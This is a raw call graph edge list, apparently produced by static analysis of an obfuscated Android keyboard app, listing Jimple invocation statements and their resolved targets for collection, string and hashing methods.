VIRTUAL edge: $r7 = virtualinvoke $r3.<lmb: lme f()>() in <hbv: void j()> ==> <lmb: lme f()>
INTERFACE edge: $z0 = interfaceinvoke $r8.<java.util.Iterator: boolean hasNext()>() in <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)> ==> <j$.util.concurrent.a: boolean hasNext()>
CLINIT edge: staticinvoke <com.google.android.apps.inputmethod.libs.framework.core.AppBase: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <com.google.android.apps.inputmethod.libs.framework.core.AppBase: void <clinit>()>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <lsz: void <init>(java.lang.String,java.lang.Class,boolean,boolean)> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: $l1 = virtualinvoke $r3.<j$.sun.misc.b: long j(java.lang.Class,java.lang.String)>(class "Lj$/util/concurrent/c;", "value") in <j$.util.concurrent.ConcurrentHashMap: void <clinit>()> ==> <j$.sun.misc.b: long j(java.lang.Class,java.lang.String)>
VIRTUAL edge: $i0 = virtualinvoke r0.<lkh: int size()>() in <lkh: java.lang.Object[] toArray(java.lang.Object[])> ==> <lql: int size()>
STATIC edge: $i0 = staticinvoke <kwe: int U(int,int,int)>($i0, 1, 1073741823) in <ljf: void i(int)> ==> <kwe: int U(int,int,int)>
VIRTUAL edge: $z0 = virtualinvoke $r3.<java.lang.String: boolean equals(java.lang.Object)>($r4) in <lsp: boolean equals(java.lang.Object)> ==> <java.lang.String: boolean equals(java.lang.Object)>
STATIC edge: $r1 = staticinvoke <iye: java.lang.Object V(java.lang.Object,java.lang.Object)>($r3, $r4) in <lme: lma d(java.lang.Object)> ==> <iye: java.lang.Object V(java.lang.Object,java.lang.Object)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r3) in <lma: lma i(int,java.lang.Object[])> ==> <lkq: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <lsc: void <init>(lto)> ==> <java.lang.Object: void <init>()>
INTERFACE edge: $z0 = interfaceinvoke $r1.<java.util.Iterator: boolean hasNext()>() in <lri: int b(java.util.Set)> ==> <lsb: boolean hasNext()>
VIRTUAL edge: $r7 = virtualinvoke $r9.<java.lang.StringBuilder: java.lang.String toString()>() in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.String toString()>
INTERFACE edge: $i1 = interfaceinvoke $r4.<java.util.Set: int size()>() in <lqs: boolean equals(java.lang.Object)> ==> <lqr: int size()>
INTERFACE edge: interfaceinvoke $r2.<java.util.List: void clear()>() in <ivv: ivw b(java.lang.String)> ==> <java.util.ArrayList: void clear()>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <gbk: void <init>(int)> ==> <java.lang.Object: void <init>()>
STATIC edge: staticinvoke <iye: java.lang.Object w(java.lang.Object)>($r1) in <lrg: void <init>(java.lang.Object)> ==> <iye: java.lang.Object w(java.lang.Object)>
VIRTUAL edge: $i6 = virtualinvoke $r3.<java.lang.Object: int hashCode()>() in <lma: lma i(int,java.lang.Object[])> ==> <java.lang.String: int hashCode()>
STATIC edge: $r2 = staticinvoke <lqq: java.lang.Object s(java.lang.Object[],int,int,int)>($r1, $i0, $i1, 1) in <lqk: void <init>(java.lang.Object[],int)> ==> <lqq: java.lang.Object s(java.lang.Object[],int,int,int)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lma: boolean equals(java.lang.Object)>
INTERFACE edge: $r3 = interfaceinvoke $r1.<java.util.Map$Entry: java.lang.Object getValue()>() in <lli: void c(java.util.Map$Entry)> ==> <ljb: java.lang.Object getValue()>
STATIC edge: staticinvoke <iye: java.lang.Object w(java.lang.Object)>($r1) in <mij: void <init>(miy)> ==> <iye: java.lang.Object w(java.lang.Object)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <lid: boolean equals(java.lang.Object)>
VIRTUAL edge: $r1 = virtualinvoke $r0.<j$.sun.misc.b: java.lang.Object g(java.lang.Object,long)>($r2, $l0) in <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l m(j$.util.concurrent.l[],int)> ==> <j$.sun.misc.b: java.lang.Object g(java.lang.Object,long)>
SPECIAL edge: specialinvoke $r0.<dwx: void <init>(int)>(7) in <dwx: void <clinit>()> ==> <dwx: void <init>(int)>
STATIC edge: staticinvoke <java.util.Arrays: void sort(java.lang.Object[],java.util.Comparator)>($r2, $r0) in <lkq: lkq A(java.util.Comparator,java.lang.Iterable)> ==> <java.util.Arrays: void sort(java.lang.Object[],java.util.Comparator)>
SPECIAL edge: specialinvoke $r9.<lwk: void <init>()>() in <lwf: void <clinit>()> ==> <lwk: void <init>()>
INTERFACE edge: $z0 = interfaceinvoke $r4.<java.util.Iterator: boolean hasNext()>() in <lri: boolean V(java.util.List,java.lang.Object)> ==> <lsb: boolean hasNext()>
VIRTUAL edge: $i6 = virtualinvoke $r3.<java.lang.Object: int hashCode()>() in <lma: lma i(int,java.lang.Object[])> ==> <java.util.AbstractMap$SimpleImmutableEntry: int hashCode()>
SPECIAL edge: specialinvoke r0.<java.util.AbstractSet: void <init>()>() in <liy: void <init>(ljd)> ==> <java.util.AbstractSet: void <init>()>
VIRTUAL edge: $i1 = virtualinvoke $r1.<lkq: int size()>() in <lkm: void <init>(lkq,int)> ==> <lql: int size()>
VIRTUAL edge: $r1 = virtualinvoke r0.<lid: java.lang.Object getKey()>() in <lid: boolean equals(java.lang.Object)> ==> <lki: java.lang.Object getKey()>
VIRTUAL edge: $i6 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.util.AbstractSet: int hashCode()>
STATIC edge: $r1 = staticinvoke <idq: idq a(java.lang.String,mag)>("TenorCategoryMetadata", $r0) in <idq: void <clinit>()> ==> <idq: idq a(java.lang.String,mag)>
STATIC edge: $i2 = staticinvoke <java.lang.Integer: int numberOfLeadingZeros(int)>($i2) in <j$.util.concurrent.ConcurrentHashMap: void a(long,int)> ==> <java.lang.Integer: int numberOfLeadingZeros(int)>
STATIC edge: $i1 = staticinvoke <lma: int e(int)>($i0) in <lqq: lqq r(int,java.lang.Object[],lkt)> ==> <lma: int e(int)>
STATIC edge: $r3 = staticinvoke <lri: java.util.Map$Entry H(java.lang.Object,java.lang.Object)>($r2, $r6) in <llg: java.lang.Object next()> ==> <lri: java.util.Map$Entry H(java.lang.Object,java.lang.Object)>
CLINIT edge: staticinvoke <lsu: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <lsu: void <clinit>()>
SPECIAL edge: specialinvoke $r2.<java.lang.NullPointerException: void <init>(java.lang.String)>($r0) in <lvm: java.lang.Object g(java.lang.Object,java.lang.String)> ==> <java.lang.NullPointerException: void <init>(java.lang.String)>
INTERFACE edge: interfaceinvoke $r9.<lse: void F(java.lang.String,java.lang.Object,java.lang.Object)>("Locale %s has invalid variant: %s", $r0, $r3) in <ivw: ivw d(java.util.Locale)> ==> <lsv: void F(java.lang.String,java.lang.Object,java.lang.Object)>
STATIC edge: $r12 = staticinvoke <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l m(j$.util.concurrent.l[],int)>($r5, $i2) in <j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])> ==> <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l m(j$.util.concurrent.l[],int)>
INTERFACE edge: $r5 = interfaceinvoke $r10.<java.util.Iterator: java.lang.Object next()>() in <hbv: void j()> ==> <lnc: java.lang.Object next()>
SPECIAL edge: specialinvoke $r9.<mly: void <init>(java.lang.Object,java.lang.Object,java.lang.Object)>($r2, $r3, $r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <mly: void <init>(java.lang.Object,java.lang.Object,java.lang.Object)>
STATIC edge: $i6 = staticinvoke <izw: int ac(int)>($i6) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <izw: int ac(int)>
VIRTUAL edge: $r3 = virtualinvoke $r3.<java.lang.String: java.lang.String substring(int,int)>(0, $i0) in <ivw: ivw d(java.util.Locale)> ==> <java.lang.String: java.lang.String substring(int,int)>
CLINIT edge: staticinvoke <ql: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <ql: void <clinit>()>
STATIC edge: $z1 = staticinvoke <j$.util.concurrent.ConcurrentHashMap: boolean b(j$.util.concurrent.l[],int,j$.util.concurrent.l)>($r3, $i2, $r6) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <j$.util.concurrent.ConcurrentHashMap: boolean b(j$.util.concurrent.l[],int,j$.util.concurrent.l)>
STATIC edge: $r2 = staticinvoke <java.util.Arrays: java.lang.Object[] copyOf(java.lang.Object[],int)>($r2, $i5) in <lma: lma i(int,java.lang.Object[])> ==> <java.util.Arrays: java.lang.Object[] copyOf(java.lang.Object[],int)>
VIRTUAL edge: $r4 = virtualinvoke r0.<ljd: int[] w()>() in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <ljd: int[] w()>
SPECIAL edge: specialinvoke $r9.<java.lang.StringBuilder: void <init>()>() in <iej: void g(java.lang.String,iec)> ==> <java.lang.StringBuilder: void <init>()>
INTERFACE edge: interfaceinvoke $r5.<java.util.Collection: boolean add(java.lang.Object)>($r2) in <lli: void e(java.lang.Object,java.lang.Object)> ==> <lkh: boolean add(java.lang.Object)>
STATIC edge: $z0 = staticinvoke <lri: boolean j(java.util.Set,java.lang.Object)>(r0, $r1) in <lma: boolean equals(java.lang.Object)> ==> <lri: boolean j(java.util.Set,java.lang.Object)>
STATIC edge: $r2 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r2) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
STATIC edge: staticinvoke <java.lang.System: void arraycopy(java.lang.Object,int,java.lang.Object,int,int)>($r5, 0, $r6, 6, $i1) in <lma: lma w(java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object[])> ==> <java.lang.System: void arraycopy(java.lang.Object,int,java.lang.Object,int,int)>
STATIC edge: $r3 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r3) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
STATIC edge: $i2 = staticinvoke <java.lang.Integer: int numberOfLeadingZeros(int)>($i2) in <j$.util.concurrent.ConcurrentHashMap: void q(int)> ==> <java.lang.Integer: int numberOfLeadingZeros(int)>
STATIC edge: $i6 = staticinvoke <java.lang.Math: int max(int,int)>(1, $i6) in <ljf: boolean add(java.lang.Object)> ==> <java.lang.Math: int max(int,int)>
VIRTUAL edge: virtualinvoke $r0.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("at index ") in <lri: void t(java.lang.Object,int)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $i1 = virtualinvoke $r0.<java.lang.String: int length()>() in <ivw: boolean v(java.lang.String)> ==> <java.lang.String: int length()>
SPECIAL edge: specialinvoke r0.<lkg: void c(java.lang.Object)>($r1) in <lly: void j(java.lang.Object)> ==> <lkg: void c(java.lang.Object)>
CLINIT edge: staticinvoke <lnd: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <lnd: void <clinit>()>
SPECIAL edge: specialinvoke r0.<java.util.AbstractSet: void <init>()>() in <ljf: void <init>()> ==> <java.util.AbstractSet: void <init>()>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.util.AbstractSet: int hashCode()>
STATIC edge: $r1 = staticinvoke <izw: java.lang.Object al(int)>($i1) in <ljf: int b()> ==> <izw: java.lang.Object al(int)>
STATIC edge: $i1 = staticinvoke <java.lang.Integer: int highestOneBit(int)>($i0) in <izw: int ae(int)> ==> <java.lang.Integer: int highestOneBit(int)>
STATIC edge: $i0 = staticinvoke <izw: int ae(int)>($i0) in <izw: int ak(int)> ==> <izw: int ae(int)>
SPECIAL edge: specialinvoke $r0.<ldr: void <init>()>() in <ldr: void <clinit>()> ==> <ldr: void <init>()>
VIRTUAL edge: $i6 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.util.AbstractSet: int hashCode()>
STATIC edge: $i3 = staticinvoke <izw: int af(int,int)>($i2, $i0) in <ljd: int z(int,int,int,int)> ==> <izw: int af(int,int)>
VIRTUAL edge: $i0 = virtualinvoke $r0.<java.lang.Object: int hashCode()>() in <izw: int ad(java.lang.Object)> ==> <java.util.AbstractMap$SimpleImmutableEntry: int hashCode()>
STATIC edge: staticinvoke <lri: void v(java.lang.Object[],int)>($r0, $i0) in <lri: void u(java.lang.Object[])> ==> <lri: void v(java.lang.Object[],int)>
SPECIAL edge: specialinvoke $r0.<coo: void <init>(int)>(2) in <coo: void <clinit>()> ==> <coo: void <init>(int)>
SPECIAL edge: specialinvoke $r14.<java.lang.StringBuilder: void <init>()>() in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: void <init>()>
VIRTUAL edge: $i1 = virtualinvoke r0.<lkq: int size()>() in <lkq: lsb C(int)> ==> <lql: int size()>
SPECIAL edge: specialinvoke $r1.<java.lang.StringBuilder: void <init>()>() in <izw: void as(int,java.lang.String)> ==> <java.lang.StringBuilder: void <init>()>
INTERFACE edge: $r8 = interfaceinvoke $r6.<java.util.Iterator: java.lang.Object next()>() in <lqs: boolean equals(java.lang.Object)> ==> <liz: java.lang.Object next()>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Throwable: java.lang.Throwable getCause()> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
CLINIT edge: staticinvoke <hfd: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <hfd: void <clinit>()>
VIRTUAL edge: $r6 = virtualinvoke r0.<ljd: java.lang.Object[] y()>() in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <ljd: java.lang.Object[] y()>
VIRTUAL edge: $i0 = virtualinvoke $r1.<lkq: int size()>() in <lqs: int size()> ==> <lql: int size()>
VIRTUAL edge: $i1 = virtualinvoke $r2.<java.lang.String: int length()>() in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.String: int length()>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Class: java.lang.Class forName(java.lang.String)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: $i6 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.lang.String: int hashCode()>
VIRTUAL edge: $r2 = virtualinvoke r0.<lkh: java.lang.Object[] n()>() in <lkh: java.lang.Object[] toArray(java.lang.Object[])> ==> <lqr: java.lang.Object[] n()>
VIRTUAL edge: virtualinvoke $r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("<") in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r1.<java.lang.IndexOutOfBoundsException: void <init>(java.lang.String)>("cannot read from empty metadata") in <ltr: lsz c(int)> ==> <java.lang.IndexOutOfBoundsException: void <init>(java.lang.String)>
SPECIAL edge: $r1 = specialinvoke r0.<lkt: lkx b(boolean)>(1) in <lkt: lkx l()> ==> <lkt: lkx b(boolean)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <hfd: void <init>(axu,java.lang.Class,ldp)> ==> <java.lang.Object: void <init>()>
SPECIAL edge: specialinvoke $r7.<lqr: void <init>(java.lang.Object[],int,java.lang.Object[],int,int)>($r2, $i4, $r0, $i0, $i5) in <lma: lma i(int,java.lang.Object[])> ==> <lqr: void <init>(java.lang.Object[],int,java.lang.Object[],int,int)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lma: boolean equals(java.lang.Object)> ==> <java.util.AbstractSet: int hashCode()>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(char)>(45) in <ivv: java.lang.String c()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(char)>
SPECIAL edge: specialinvoke $r2.<java.lang.NullPointerException: void <init>(java.lang.String)>($r4) in <izw: void aq(java.lang.Object,java.lang.Object)> ==> <java.lang.NullPointerException: void <init>(java.lang.String)>
STATIC edge: $r1 = staticinvoke <idq: idq a(java.lang.String,mag)>("GifThumbnail", $r0) in <idq: void <clinit>()> ==> <idq: idq a(java.lang.String,mag)>
SPECIAL edge: specialinvoke $r9.<j$.util.concurrent.r: void <init>(j$.util.concurrent.s)>($r7) in <j$.util.concurrent.ConcurrentHashMap: void p(j$.util.concurrent.l[],int)> ==> <j$.util.concurrent.r: void <init>(j$.util.concurrent.s)>
VIRTUAL edge: virtualinvoke $r9.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("Empty subtag, error index: ") in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $i1 = virtualinvoke $r11.<lma: int size()>() in <lmb: lme f()> ==> <lrg: int size()>
STATIC edge: $z0 = staticinvoke <java.util.Arrays: boolean equals(int[],int[])>($r8, $r9) in <j$.util.Objects: boolean deepEquals(java.lang.Object,java.lang.Object)> ==> <java.util.Arrays: boolean equals(int[],int[])>
INTERFACE edge: $i0 = interfaceinvoke $r10.<java.util.Collection: int size()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <lql: int size()>
INTERFACE edge: $r2 = interfaceinvoke $r1.<java.util.Iterator: java.lang.Object next()>() in <lri: int b(java.util.Set)> ==> <lsb: java.lang.Object next()>
VIRTUAL edge: $r6 = virtualinvoke r0.<lqs: lsa l()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <lqs: lsa l()>
INTERFACE edge: $r3 = interfaceinvoke $r2.<java.util.Map$Entry: java.lang.Object getValue()>() in <lid: boolean equals(java.lang.Object)> ==> <java.util.AbstractMap$SimpleImmutableEntry: java.lang.Object getValue()>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lta: boolean equals(java.lang.Object)> ==> <lsp: boolean equals(java.lang.Object)>
VIRTUAL edge: $i0 = virtualinvoke r0.<lma: int hashCode()>() in <lma: boolean equals(java.lang.Object)> ==> <lrg: int hashCode()>
SPECIAL edge: specialinvoke $r0.<java.lang.IndexOutOfBoundsException: void <init>(java.lang.String)>($r3) in <iye: void O(int,int)> ==> <java.lang.IndexOutOfBoundsException: void <init>(java.lang.String)>
STATIC edge: $i0 = staticinvoke <j$.util.concurrent.ConcurrentHashMap: int k(int)>($i0) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <j$.util.concurrent.ConcurrentHashMap: int k(int)>
VIRTUAL edge: $z0 = virtualinvoke $r4.<nzh: boolean e()>() in <ivv: ivw b(java.lang.String)> ==> <nzh: boolean e()>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <java.lang.Enum: int hashCode()>
INTERFACE edge: $i0 = interfaceinvoke $r1.<java.util.Map: int size()>() in <ljd: int size()> ==> <java.util.HashMap: int size()>
STATIC edge: $i6 = staticinvoke <java.lang.Math: int min(int,int)>(1073741823, $i6) in <ljf: boolean add(java.lang.Object)> ==> <java.lang.Math: int min(int,int)>
STATIC edge: $z0 = staticinvoke <kzs: boolean d(java.lang.Object,java.lang.Object)>($r1, $r3) in <lid: boolean equals(java.lang.Object)> ==> <kzs: boolean d(java.lang.Object,java.lang.Object)>
STATIC edge: $r1 = staticinvoke <iye: java.lang.String X(int,int,java.lang.String)>($i1, $i0, "index") in <iye: void Q(int,int)> ==> <iye: java.lang.String X(int,int,java.lang.String)>
STATIC edge: $i8 = staticinvoke <izw: int aj(java.lang.Object,int)>($r1, $i3) in <ljd: int z(int,int,int,int)> ==> <izw: int aj(java.lang.Object,int)>
VIRTUAL edge: $r2 = virtualinvoke r0.<ljd: java.util.Map o()>() in <ljd: java.lang.Object get(java.lang.Object)> ==> <ljd: java.util.Map o()>
VIRTUAL edge: $r2 = virtualinvoke $r1.<java.lang.StringBuilder: java.lang.String toString()>() in <izw: void as(int,java.lang.String)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lkq: int hashCode()>
VIRTUAL edge: $r3 = virtualinvoke $r2.<mly: java.lang.IllegalArgumentException f()>() in <lkt: lkx b(boolean)> ==> <mly: java.lang.IllegalArgumentException f()>
VIRTUAL edge: $c1 = virtualinvoke $r0.<java.lang.String: char charAt(int)>(2) in <ivw: boolean F(java.lang.String)> ==> <java.lang.String: char charAt(int)>
STATIC edge: $r0 = staticinvoke <j$.util.concurrent.r: j$.util.concurrent.s g(j$.util.concurrent.s,j$.util.concurrent.s)>($r0, $r2) in <j$.util.concurrent.r: j$.util.concurrent.s c(j$.util.concurrent.s,j$.util.concurrent.s)> ==> <j$.util.concurrent.r: j$.util.concurrent.s g(j$.util.concurrent.s,j$.util.concurrent.s)>
INTERFACE edge: $r2 = interfaceinvoke $r3.<java.util.Map: java.lang.Object put(java.lang.Object,java.lang.Object)>($r2, $r1) in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <java.util.HashMap: java.lang.Object put(java.lang.Object,java.lang.Object)>
SPECIAL edge: specialinvoke $r3.<java.lang.IllegalStateException: void <init>(java.lang.String)>($r4) in <hbv: void k(java.lang.Object,boolean)> ==> <java.lang.IllegalStateException: void <init>(java.lang.String)>
VIRTUAL edge: virtualinvoke $r4.<nzh: void d()>() in <ivv: ivw b(java.lang.String)> ==> <nzh: void d()>
VIRTUAL edge: $r14 = virtualinvoke $r7.<lts: lsz c(int)>($i1) in <lsd: boolean b(lsr)> ==> <lsm: lsz c(int)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r1) in <j$.util.concurrent.k: boolean equals(java.lang.Object)> ==> <lta: boolean equals(java.lang.Object)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lma: boolean equals(java.lang.Object)> ==> <lrg: int hashCode()>
STATIC edge: $z0 = staticinvoke <ivw: boolean O(char)>($c2) in <ivw: boolean s(java.lang.String)> ==> <ivw: boolean O(char)>
VIRTUAL edge: virtualinvoke $r3.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.Object)>($r4) in <mly: java.lang.IllegalArgumentException f()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.Object)>
SPECIAL edge: specialinvoke $r6.<j$.util.concurrent.w: void <init>()>() in <j$.util.concurrent.ThreadLocalRandom: void <clinit>()> ==> <j$.util.concurrent.w: void <init>()>
VIRTUAL edge: $i6 = virtualinvoke $r3.<java.lang.Object: int hashCode()>() in <lma: lma i(int,java.lang.Object[])> ==> <lqr: int hashCode()>
CLINIT edge: staticinvoke <lwe: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <lwe: void <clinit>()>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <lma: boolean equals(java.lang.Object)>
VIRTUAL edge: virtualinvoke $r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r4) in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: $r1 = staticinvoke <idq: idq a(java.lang.String,mag)>("TenorAutocompleteMetadata", $r0) in <idq: void <clinit>()> ==> <idq: idq a(java.lang.String,mag)>
INTERFACE edge: $r3 = interfaceinvoke $r7.<java.util.Iterator: java.lang.Object next()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <lsb: java.lang.Object next()>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(char)>(45) in <ivv: java.lang.String c()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(char)>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lrg: int hashCode()> ==> <lrg: int hashCode()>
VIRTUAL edge: $r1 = virtualinvoke r0.<lqs: lsa l()>() in <lqs: java.util.Iterator iterator()> ==> <lqs: lsa l()>
VIRTUAL edge: $i0 = virtualinvoke r0.<ljd: int e()>() in <ljd: java.util.Map m()> ==> <ljd: int e()>
VIRTUAL edge: $i6 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <lkq: int hashCode()>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <lkq: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <nzh: void <init>()> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: $r1 = virtualinvoke r0.<ljf: java.util.Set g()>() in <ljf: java.util.Iterator iterator()> ==> <ljf: java.util.Set g()>
SPECIAL edge: specialinvoke $r2.<nzh: void <init>()>() in <ivv: void <init>(byte[])> ==> <nzh: void <init>()>
STATIC edge: staticinvoke <ojg: void d(java.lang.Object,java.lang.String)>($r1, "destination") in <nvw: void j(int[],int[],int,int,int)> ==> <ojg: void d(java.lang.Object,java.lang.String)>
INTERFACE edge: $i0 = interfaceinvoke $r10.<java.util.Collection: int size()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <lrg: int size()>
INTERFACE edge: $r4 = interfaceinvoke $r3.<java.util.Map: java.lang.Object get(java.lang.Object)>($r1) in <lli: void e(java.lang.Object,java.lang.Object)> ==> <ljd: java.lang.Object get(java.lang.Object)>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.String: int length()>() in <ivv: void g(java.lang.String)> ==> <java.lang.String: int length()>
VIRTUAL edge: $r7 = virtualinvoke $r4.<nzh: java.lang.String c()>() in <ivv: ivw b(java.lang.String)> ==> <nzh: java.lang.String c()>
STATIC edge: $r5 = staticinvoke <lqd: lqd b(java.util.Comparator)>($r4) in <lmb: lme f()> ==> <lqd: lqd b(java.util.Comparator)>
VIRTUAL edge: $i0 = virtualinvoke r0.<lkq: int size()>() in <lkq: int hashCode()> ==> <lql: int size()>
VIRTUAL edge: $i6 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <lkq: int hashCode()>
SPECIAL edge: specialinvoke $r25.<j$.util.concurrent.l: void <init>(int,java.lang.Object,java.lang.Object,j$.util.concurrent.l)>($i5, $r15, $r16, $r10) in <j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])> ==> <j$.util.concurrent.l: void <init>(int,java.lang.Object,java.lang.Object,j$.util.concurrent.l)>
SPECIAL edge: $r3 = specialinvoke r0.<ljf: java.lang.Object[] s()>() in <ljf: void j(int,java.lang.Object,int,int)> ==> <ljf: java.lang.Object[] s()>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lma: boolean equals(java.lang.Object)> ==> <lqr: int hashCode()>
VIRTUAL edge: $z1 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <lta: boolean equals(java.lang.Object)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <lma: boolean equals(java.lang.Object)>
STATIC edge: $r6 = staticinvoke <java.lang.Integer: java.lang.Integer valueOf(int)>($i4) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.lang.Integer: java.lang.Integer valueOf(int)>
STATIC edge: $i0 = staticinvoke <izw: int ag(int,int,int)>($i0, $i1, 31) in <ljf: void q(int)> ==> <izw: int ag(int,int,int)>
SPECIAL edge: specialinvoke $r1.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.LinkageError: void <init>()> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
